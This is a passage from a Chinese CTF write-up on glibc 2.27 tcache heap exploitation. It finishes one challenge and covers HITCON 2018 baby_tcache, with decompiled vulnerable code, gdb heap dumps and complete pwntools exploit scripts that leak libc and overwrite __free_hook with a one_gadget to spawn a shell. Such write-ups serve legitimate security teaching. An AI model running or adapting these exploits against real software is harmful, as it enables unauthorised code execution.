    <span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="c1">#kong 2  other point : place  0x100 in prev_size of id3 chunk</span>
    <span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="c1">#kong 4</span>
</pre></div>

<ul>
<li>经过上述操作后 ，内存布局如下</li>
</ul>
<div class="codehilite"><pre><span></span>#ps : heap part : tcache chunk( size 0x250 ) , next comes the chunk (size 0xb0) that manages subsequent allocations of chunks (id0-id9)
#ps : look at id0 id2 id4 chunk
gdb-peda$ x/300xg 0x55e5d0fdf300
0x55e5d0fdf300:(!!!)0x0000000000000000      0x0000000000000101    ===&gt; id0
0x55e5d0fdf310:  ^  0x00007fa5c2e18ca0      0x000055e5d0fdf500
0x55e5d0fdf320:  |  0x0000000000000000      0x0000000000000000
...............  |                           
0x55e5d0fdf3f0:  |  0x0000000000000000      0x0000000000000000    
0x55e5d0fdf400:  |  0x0000000000000100      0x0000000000000100    ===&gt; id1
0x55e5d0fdf410:  |  0x0000000000000000      0x0000000000000000
...............  |                           
0x55e5d0fdf4f0:  |  0x0000000000000000      0x0000000000000000
0x55e5d0fdf500:  +  0x0000000000000000      0x0000000000000101    ===&gt; id2
0x55e5d0fdf510: (fd)0x000055e5d0fdf300  (bk)0x000055e5d0fdf700
...............                           + 
0x55e5d0fdf600:     0x0000000000000100    | 0x0000000000000100    ===&gt; id3 
0x55e5d0fdf610:     0x000055e5d0fdf410    | 0x0000000000000000
0x55e5d0fdf620:     0x0000000000000000    | 0x0000000000000000
...............                           |
0x55e5d0fdf700:(!!!)0x0000000000000000&lt;---+ 0x0000000000000101    ===&gt; id4
0x55e5d0fdf710:     0x000055e5d0fdf500      0x00007fa5c2e18ca0
0x55e5d0fdf720:     0x0000000000000000      0x0000000000000000
...............                             
0x55e5d0fdf800:     0x0000000000000100      0x0000000000000100    ===&gt; id5
0x55e5d0fdf810:     0x000055e5d0fdf610      0x0000000000000000
0x55e5d0fdf820:     0x0000000000000000      0x0000000000000000
...............                             
0x55e5d0fdf900:     0x0000000000000000      0x0000000000000101    ===&gt; id6
0x55e5d0fdf910:     0x000055e5d0fdf810      0x0000000000000000
0x55e5d0fdf920:     0x0000000000000000      0x0000000000000000
...............                             
0x55e5d0fdfa00:     0x0000000000000000      0x0000000000000101    ===&gt; id7
0x55e5d0fdfa10:     0x000055e5d0fdf910      0x0000000000000000
0x55e5d0fdfa20:     0x0000000000000000      0x0000000000000000
...............                             
0x55e5d0fdfaf0:     0x0000000000000000      0x0000000000000000    ===&gt; id8
0x55e5d0fdfb00:     0x0000000000000000      0x0000000000000101
0x55e5d0fdfb10:     0x000055e5d0fdfa10      0x0000000000000000
...............                             
0x55e5d0fdfc00:     0x0000000000000000      0x0000000000000101    ===&gt; id9
0x55e5d0fdfc10:     0x000055e5d0fdfb10      0x0000000000000000
0x55e5d0fdfc20:     0x0000000000000000      0x0000000000000000
...............                             
0x55e5d0fdfd00:     0x0000000000000000      0x0000000000020301    ===&gt; top
0x55e5d0fdfd10:     0x0000000000000000      0x0000000000000000

# tcache next : id9-&gt;id8-&gt;id7-&gt;id6-&gt;id5-&gt;id3-&gt;id1
# unsortedbin bk : id0--&gt;id2--&gt;id4
</pre></div>

<ul>
<li>再连续申请 7 chunk ，使得后续的 unsortedbin chunk 有机会进入到 tcahce</li>
</ul>
<div class="codehilite"><pre><span></span>    <span class="c1">#get chunk from tcache</span>
    <span class="n">malloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">240</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1">#0 id9</span>
    <span class="n">malloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">240</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1">#1 id8</span>
    <span class="n">malloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">240</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1">#2 id7</span>
    <span class="n">malloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">240</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1">#3 id6</span>
    <span class="n">malloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">240</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1">#4 id5</span>
    <span class="n">malloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">240</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1">#5 id3</span>
    <span class="n">malloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">240</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1">#6 id1</span>

    <span class="c1">#get id4 (id 0 2 4 get to tcache , the tcache next : 4-&gt;2-&gt;0, so get id4 first from tcache)</span>
    <span class="n">malloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">240</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1">#7 id4 ：keep the fd_of_id4 = id2</span>
    <span class="c1">#get id2 (fd_of_id2-&gt;bk-&gt;fd = id2 and bk_of_id2-&gt;fd-&gt;bk = id2) satisfy the condition that unlink id2</span>
    <span class="n">malloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">248</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1">#8 id2 0xf8=248 ===&gt;id3 prev:0x100 size:0x100</span>

    <span class="c1">#now id0 is in tcache , so just need free other 6 chunk to fill the tcache , and the bk_of_id0 = id2</span>
    <span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">6</span><span class="p">)</span>  <span class="c1">#kong6   id1</span>
    <span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>  <span class="c1">#kong4   id5</span>
    <span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>  <span class="c1">#kong3   id6</span>
    <span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>  <span class="c1">#kong2   id7</span>
    <span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>  <span class="c1">#kong1   id8</span>
    <span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>  <span class="c1">#kong0   id9</span>

    <span class="c1">#if free id3 will place in unsortedbin , and free id3 will find that id2 is freed , so the unlink will happen , merge to id2</span>
    <span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span>  <span class="c1">#kong5  id3  unlink id2--&gt;0x200</span>
</pre></div>

<ul>
<li>经过上述操作后 ，内存布局如下</li>
</ul>
<div class="codehilite"><pre><span></span>gdb-peda$ x/300xg 0x55e5d0fdf300
0x55e5d0fdf300: 0x0000000000000000  0x0000000000000101    ===&gt;  id0
0x55e5d0fdf310: 0x0000000000000000  0x000055e5d0fdf700
0x55e5d0fdf320: 0x0000000000000000  0x0000000000000000
...............
0x55e5d0fdf400: 0x0000000000000100  0x0000000000000101    ===&gt;  #6 id1
0x55e5d0fdf410: 0x000055e5d0fdf310  0x0000000000000000
0x55e5d0fdf420: 0x0000000000000000  0x0000000000000000
...............
0x55e5d0fdf500: 0x0000000000000000  0x0000000000000201    ===&gt;  #8 id2  can leak , becasue the #8 we can show
0x55e5d0fdf510: 0x00007fa5c2e18ca0  0x00007fa5c2e18ca0
0x55e5d0fdf520: 0x0000000000000000  0x0000000000000000
...............
0x55e5d0fdf600: 0x0000000000000100  0x0000000000000100    ===&gt;  #5 id3
0x55e5d0fdf610: 0x0000000000000000  0x0000000000000000
0x55e5d0fdf620: 0x0000000000000000  0x0000000000000000
...............
0x55e5d0fdf700: 0x0000000000000200  0x0000000000000100    ===&gt;  #7 id4
0x55e5d0fdf710: 0x000055e5d0fdf300  0x00007fa5c2e18ca0
0x55e5d0fdf720: 0x0000000000000000  0x0000000000000000
...............
</pre></div>

<ul>
<li>信息泄露</li>
</ul>
<div class="codehilite"><pre><span></span>    <span class="c1">#leak the unsortedbin addr</span>
    <span class="n">puts</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span> <span class="c1">#show id2</span>
    <span class="n">unso_addr</span> <span class="o">=</span> <span class="n">pick64</span><span class="p">(</span><span class="n">r</span><span class="p">(</span><span class="mi">6</span><span class="p">))</span>
    <span class="k">print</span> <span class="s2">&quot;unso_addr @ &quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">unso_addr</span><span class="p">)</span>
    <span class="n">libc_base</span> <span class="o">=</span> <span class="n">unso_addr</span> <span class="o">-</span> <span class="p">(</span><span class="mh">0x00007f94a5acbca0</span><span class="o">-</span><span class="mh">0x00007f94a56e0000</span><span class="p">)</span>
    <span class="k">print</span> <span class="s2">&quot;libc_base @ &quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span>
    <span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="p">(</span><span class="mh">0x7f94a5acd8e8</span><span class="o">-</span><span class="mh">0x00007f94a56e0000</span><span class="p">)</span>
    <span class="n">one_shoot</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x4f322</span>     <span class="c1">#execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span>
</pre></div>

<ul>
<li>改写 tcache 的 next ，再分配 chunk ，得到 shell</li>
</ul>
<div class="codehilite"><pre><span></span>    <span class="c1">#get chunk from tcache</span>
    <span class="n">malloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">240</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1">#0 id9</span>
    <span class="n">malloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">240</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1">#1 id8</span>
    <span class="n">malloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">240</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1">#2 id7</span>
    <span class="n">malloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">240</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1">#3 id6</span>
    <span class="n">malloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">240</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1">#4 id5</span>
    <span class="n">malloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">240</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1">#5 id1</span>
    <span class="n">malloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">240</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1">#6 id0</span>

    <span class="c1">#cut from the unso , the left of id2_3chunk placed in unso</span>
    <span class="n">malloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">240</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1">#9 the id2 of id2_3 tips: #8:id2 , so we can double free tcache chunk</span>

    <span class="c1">#placed in tcache</span>
    <span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="c1">#kong0 id9 just for give a position to malloc</span>
    <span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span> <span class="c1">#kong8 id2</span>
    <span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span> <span class="c1">#kong9 id2</span>

    <span class="c1">#get from tcache</span>
    <span class="n">malloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">240</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1">#0 id2</span>
    <span class="n">malloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">240</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1">#8 id2</span>
    <span class="n">malloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">240</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_shoot</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1">#9 free_hook_chunk</span>

    <span class="c1">#one_shoot triger</span>
    <span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>  <span class="c1">#1 id8</span>
    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>

<h5 id="challenge-1">Challenge 1 小结<a class="headerlink" href="#challenge-1" title="Permanent link">&para;</a></h5>
<p>尽管作者尽力展示所有的细节 ，发现越要展示更多细节 ，越不容易讲清楚 ，所以最好画图和亲自调试一下 。简单来讲就是在某些限制下如何通过一系列的操作 tcahce chunk 和 unsortedbin 实现 unlink 。</p>
<h4 id="challenge-2-hitcon-2018-pwn-baby_tcache">Challenge 2 : HITCON 2018 PWN baby_tcache<a class="headerlink" href="#challenge-2-hitcon-2018-pwn-baby_tcache" title="Permanent link">&para;</a></h4>
<h5 id="_5">基本信息<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h5>
<p>远程环境中的 libc 是 libc-2.27.so 和上面的题目一样。</p>
<div class="codehilite"><pre><span></span>zj@zj-virtual-machine:~/c_study/hitcon2018/pwn1$ checksec ./baby_tcache
<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/zj/c_study/hitcon2018/pwn1/baby_tcache&#39;</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
</pre></div>

<h5 id="_6">基本功能<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h5>
<p>程序的功能很简单 ，就2个功能 ，一个功能为 New 申请使用内存不大于 0x2000 的 chunk ，总共可以申请 10 块 ，通过 bss 段上的一个全局数组 arr 来管理申请的 chunk ，同时 bss 段上的数组 size_arr 来存储相应 chunk 的申请大小 size 。</p>
<p>程序的另外一个功能就是 delete ，删除所选的堆块 ，删除之前会事先把 chunk 的内容区域按照申请的 size 覆盖成 0xdadadada 。</p>
<p>程序的漏洞代码在功能 New 的时候 ，写完数据后 ，有一个 null-byte 溢出漏洞 ，具体如下 ：</p>
<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="nf">new</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">_QWORD</span> <span class="o">*</span><span class="n">v0</span><span class="p">;</span> <span class="c1">// rax</span>
  <span class="kt">signed</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-14h]</span>
  <span class="n">_BYTE</span> <span class="o">*</span><span class="n">malloc_p</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-10h]</span>
  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]</span>

  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">i</span> <span class="o">&gt;</span> <span class="mi">9</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">LODWORD</span><span class="p">(</span><span class="n">v0</span><span class="p">)</span> <span class="o">=</span> <span class="n">puts</span><span class="p">(</span><span class="s">&quot;:(&quot;</span><span class="p">);</span>
      <span class="k">return</span> <span class="p">(</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">v0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">bss_arr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">)</span>
      <span class="k">break</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Size:&quot;</span><span class="p">);</span>
  <span class="n">size</span> <span class="o">=</span> <span class="n">str2llnum</span><span class="p">();</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0x2000</span> <span class="p">)</span>
    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">2</span><span class="p">);</span>
  <span class="n">malloc_p</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">malloc_p</span> <span class="p">)</span>
    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Data:&quot;</span><span class="p">);</span>
  <span class="n">read_input</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="n">malloc_p</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
  <span class="n">malloc_p</span><span class="p">[</span><span class="n">size</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>                           <span class="c1">//null byte bof</span>
  <span class="n">bss_arr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc_p</span><span class="p">;</span>
  <span class="n">v0</span> <span class="o">=</span> <span class="n">size_arr</span><span class="p">;</span>
  <span class="n">size_arr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
  <span class="k">return</span> <span class="p">(</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">v0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>

<h5 id="_7">利用思路<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h5>
<p>程序的漏洞很容易发现 ，而且申请的 chunk 大小可控 ，所以一般考虑构造 overlapping chunk 处理 。但是问题在于即使把 main_arena 相关的地址写到了 chunk 上 ，也没法调用 show 功能做信息泄露 ，因为程序就没提供这个功能 。</p>
<p>当然如果没有信息泄露也可以考虑 part write 去改掉 main_arena 相关地址的后几个字节 ，利用 tcache 机制把 <code>__free_hook</code> chunk 写进 tcache 的链表中 ，后面利用 unsortedbin attack 往 <code>__free_hook</code> 里面写上 unsortedbin addr ，后面把 <code>__free_hook</code> 分配出来 ，再利用 part write 在 <code>__free_hook</code> 里面写上 one_shoot ，不过这个方法的爆破工作量太大需要4096次 ，感兴趣的可以试试 。</p>
<p>出题者提供一个基于文件结构体的内存读方法来实现内存泄露 ，简单说来就是修改 puts 函数工作过程中 stdout 结构的 <code>__IO_write_base</code> ，从而达到内存泄露 ，这个方法的优点在于只爆破半个字节 run 16 次即可 ，具体操作见后面的 exp 解析部分 。</p>
<h5 id="_8">操作过程<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h5>
<ul>
<li>exp 部分</li>
</ul>
<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">r</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;./baby_tcache&#39;</span><span class="p">),</span><span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;LD_PRELOAD&quot;</span><span class="p">:</span><span class="s2">&quot;./libc.so.6&quot;</span><span class="p">})</span>

<span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./libc.so.6&quot;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">menu</span><span class="p">(</span><span class="n">opt</span><span class="p">):</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;Your choice: &quot;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">opt</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="s1">&#39;a&#39;</span><span class="p">):</span>
    <span class="n">menu</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;Size:&quot;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&quot;Data:&quot;</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">menu</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;Index:&quot;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">exp</span><span class="p">():</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x500</span><span class="o">-</span><span class="mh">0x8</span><span class="p">)</span>  <span class="c1"># 0</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span>   <span class="c1"># 1</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x40</span><span class="p">)</span>  <span class="c1"># 2</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x50</span><span class="p">)</span>  <span class="c1"># 3</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span>  <span class="c1"># 4</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x500</span><span class="o">-</span><span class="mh">0x8</span><span class="p">)</span>  <span class="c1"># 5</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x70</span><span class="p">)</span>  <span class="c1"># 6  gap to top</span>

    <span class="n">delete</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x60</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x60\x06</span><span class="s1">&#39;</span><span class="p">)</span>  <span class="c1"># set the prev size</span>

    <span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">delete</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>  <span class="c1"># backward coeleacsing</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x500</span><span class="o">-</span><span class="mh">0x9</span><span class="o">+</span><span class="mh">0x34</span><span class="p">)</span>
    <span class="n">delete</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0xa8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x60\x07</span><span class="s1">&#39;</span><span class="p">)</span>  <span class="c1"># corrupt the fd</span>

    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>

    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x3e</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad1800</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>  <span class="c1"># overwrite the file-structure</span>

    <span class="k">print</span> <span class="nb">repr</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
    <span class="k">print</span> <span class="s2">&quot;leak!!!!!!!!!&quot;</span>
    <span class="n">info1</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
    <span class="k">print</span> <span class="nb">repr</span><span class="p">(</span><span class="n">info1</span><span class="p">)</span>
    <span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">info1</span><span class="p">)</span><span class="o">-</span><span class="mh">0x3ed8b0</span>
    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;libc @ &quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0xa8</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]))</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="s2">&quot;A&quot;</span><span class="p">)</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x4f322</span><span class="p">))</span> <span class="c1"># one gadget with $rsp+0x40 = NULL</span>
    <span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="k">if</span> <span class="vm">__name__</span><span class="o">==</span><span class="s1">&#39;__main__&#39;</span><span class="p">:</span>

    <span class="n">exp</span><span class="p">()</span>
</pre></div>

<ul>
<li>形成 overlapping chunk</li>
</ul>
<div class="codehilite"><pre><span></span>    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x500</span><span class="o">-</span><span class="mh">0x8</span><span class="p">)</span>  <span class="c1"># 0</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span>   <span class="c1"># 1</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x40</span><span class="p">)</span>  <span class="c1"># 2</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x50</span><span class="p">)</span>  <span class="c1"># 3</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span>  <span class="c1"># 4</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x500</span><span class="o">-</span><span class="mh">0x8</span><span class="p">)</span>  <span class="c1"># 5</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x70</span><span class="p">)</span>  <span class="c1"># 6  gap to top</span>

    <span class="n">delete</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x60</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x60\x06</span><span class="s1">&#39;</span><span class="p">)</span>  <span class="c1"># set the prev size</span>

    <span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">delete</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>  <span class="c1"># backward coeleacsing</span>
</pre></div>

<div class="codehilite"><pre><span></span>gdb-peda$ x/300xg 0x0000555d56ed6000+0x250
0x555d56ed6250: 0x0000000000000000  0x0000000000000b61  ( free(#5) ==&gt; merge into #0 get 0x660+0x500=0xb60 chunk ) #0
0x555d56ed6260: 0x00007fa8a0a3fca0  0x00007fa8a0a3fca0
0x555d56ed6270: 0x0000000000000000  0x0000000000000000
0x555d56ed6280: 0xdadadadadadadada  0xdadadadadadadada
...............
0x555d56ed6740: 0xdadadadadadadada  0xdadadadadadadada
0x555d56ed6750: 0x0000000000000500  0x0000000000000040   #1
0x555d56ed6760: 0x0000000000000061(&#39;a&#39;) 0x0000000000000000
0x555d56ed6770: 0x0000000000000000  0x0000000000000000
